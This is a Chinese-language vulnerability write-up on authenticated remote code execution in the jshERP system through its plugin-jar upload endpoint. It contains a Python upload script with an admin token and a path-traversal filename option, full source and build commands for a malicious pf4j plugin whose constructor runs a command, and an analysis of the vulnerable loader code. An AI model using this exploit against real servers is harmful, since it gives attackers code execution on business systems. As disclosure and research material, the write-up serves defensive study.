# jar包插件上传RCE

后台存在插件上传jar包功能

需要管理员token，然后上传jar包

```python
import requests

url = "http://192.168.239.1:9999/jshERP-boot/plugin/uploadInstallPluginJar"

#proxy = {'http': 'http://127.0.0.1:8080'}

target_path = "pf4jEXP.jar" #首先需要创建plugins目录，target_path可以替换成../plugins/pf4jEXP.jar

headers = {'X-Access-Token': "1e13e06a997b424c8c3e5829419d4b1f_0"}

with open(r"D:\idea\project\pf4jEXP\src\pf4jEXP.jar", "rb") as f:
    files = {
        'file': (target_path, f, 'application/octet-stream')
    }
    response = requests.post(url, files=files, headers=headers)

print(response.text)
```

## Jar包构造

jar包构造时目录

```
com
	gitee
		starblues
			realize
				BasePlugin.java
				org
					pf4j
						Plugin.java
						PluginWrapper.java
META-INF
	MANIFEST.MF
```

MANIFEST.MF，注意要多一个换行符

```
Manifest-Version: 1.0
Plugin-Id: my-exploit-plugin
Plugin-Version: 1.0.0
Plugin-Class: com.gitee.starblues.realize.BasePlugin
Plugin-Provider: starblues

```

BasePlugin.java

```java
package com.gitee.starblues.realize;

import org.pf4j.Plugin;
import org.pf4j.PluginWrapper;

public class BasePlugin extends Plugin {
    public BasePlugin(PluginWrapper wrapper) {
        super(wrapper);
        try {
            java.lang.Runtime.getRuntime().exec("calc");
        } catch (Exception e) {}
    }

    @Override
    public void start() {
    }
}
```

Plugin.java和PluginWrapper.java都是伪类，目的是让BasePlugin.java编译通过

Plugin.java

```java
package org.pf4j;
public abstract class Plugin {
    protected Plugin(PluginWrapper wrapper) {}
    public void start() {}
    public void stop() {}
}
```

PluginWrapper.java

```java
package org.pf4j;
public interface PluginWrapper {}
```

javac编译

```
javac org/pf4j/*.java BasePlugin.java
```

编译完成后，删除org目录，删除.java文件，只保留BasePlugin.class

然后打包成jar

```
jar -cvfm pf4jEXP.jar META-INF/MANIFEST.MF com
```

## Code

漏洞出现在`com.gitee.starblues.integration.operator.DefaultPluginOperator`，`startPlugin`方法调用前未验证用户上传的jar包是否合法

```java
public boolean start(String pluginId) throws Exception {
        if (StringUtils.isEmpty(pluginId)) {
            throw new IllegalArgumentException("Method:start param 'pluginId' can not be empty");
        } else {
            PluginWrapper pluginWrapper = this.getPluginWrapper(pluginId, "Start");
            if (pluginWrapper.getPluginState() == PluginState.STARTED) {
                throw new Exception("This plugin '" + pluginId + "' have already started");
            } else {
                try {
                    PluginState pluginState = this.pluginManager.startPlugin(pluginId);
                    if (pluginState == PluginState.STARTED) {
                        GlobalRegistryInfo.addOperatorPluginInfo(pluginId, OperatorType.START, false);
                        this.pluginFactory.registry(pluginWrapper);
                        this.pluginFactory.build();
                        this.log.info("Plugin '{}' start success", pluginId);
                        return true;
                    } else {
                        this.log.error("Plugin '{}' start failure, plugin state is not start. Current plugin state is '{}'", pluginId, pluginState.toString());
                        return false;
                    }
                } catch (Exception var6) {
                    this.log.error("Plugin '{}' start failure. {}", pluginId, var6.getMessage());
                    this.log.info("Start stop plugin {}", pluginId);

                    try {
                        this.stop(pluginId);
                    } catch (Exception var5) {
                        this.log.error("Plugin '{}' stop failure. {}", pluginId, var6.getMessage());
                    }

                    throw var6;
                }
            }
        }
    }
```

最终触发点在`org.pf4j.DefaultPluginFactory`，`constructor.newInstance(pluginWrapper)`方法调用jar包中的恶意类的构造函数，触发RCE

```java
public Plugin create(PluginWrapper pluginWrapper) {
        String pluginClassName = pluginWrapper.getDescriptor().getPluginClass();
        log.debug("Create instance for plugin '{}'", pluginClassName);

        Class pluginClass;
        try {
            pluginClass = pluginWrapper.getPluginClassLoader().loadClass(pluginClassName);
        } catch (ClassNotFoundException var7) {
            log.error(var7.getMessage(), var7);
            return null;
        }

        int modifiers = pluginClass.getModifiers();
        if (!Modifier.isAbstract(modifiers) && !Modifier.isInterface(modifiers) && Plugin.class.isAssignableFrom(pluginClass)) {
            try {
                Constructor<?> constructor = pluginClass.getConstructor(PluginWrapper.class);
                return (Plugin)constructor.newInstance(pluginWrapper);
            } catch (Exception var6) {
                log.error(var6.getMessage(), var6);
                return null;
            }
        } else {
            log.error("The plugin class '{}' is not valid", pluginClassName);
            return null;
        }
    }
```

